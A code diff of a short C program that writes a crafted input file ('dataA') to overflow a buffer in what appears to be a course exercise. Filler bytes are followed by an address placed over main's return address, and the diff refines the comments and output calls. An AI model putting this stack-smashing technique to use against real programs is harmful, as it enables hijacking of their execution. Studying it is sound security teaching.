@@ -13,20 +13,19 @@ int main(void)
 
     psFile = fopen("dataA", "w");
 
-    /* buf[0 - 17] */
+    /* buf[0-19] */
     fprintf(psFile, "Maxwell and Melody");
-    /* buf[18-19] */
-    fprintf(psFile, "%c", '\0');
-    fprintf(psFile, "%c", '\0');
+    putc('\0', psFile);
+    putc('\0', psFile);
     /* buf[20-23] */
     fwrite(&uiData2, sizeof(unsigned int), 1, psFile);
     /* buf[24-27] */
     fwrite(&uiData3, sizeof(unsigned int), 1, psFile);
     /* buf[28-47] */
     fprintf(psFile, "fillerfillerfillerfi");
-    /* buf[48-55] (x30) */
+    /* buf[48-55] (main return address) */
     fwrite(&ulData1, sizeof(unsigned long), 1, psFile);
     /* buf[56] (newline in unused memory) */
-    fprintf(psFile, "%c", '\n');
+    putc('\n', psFile);
     return 0;
 }
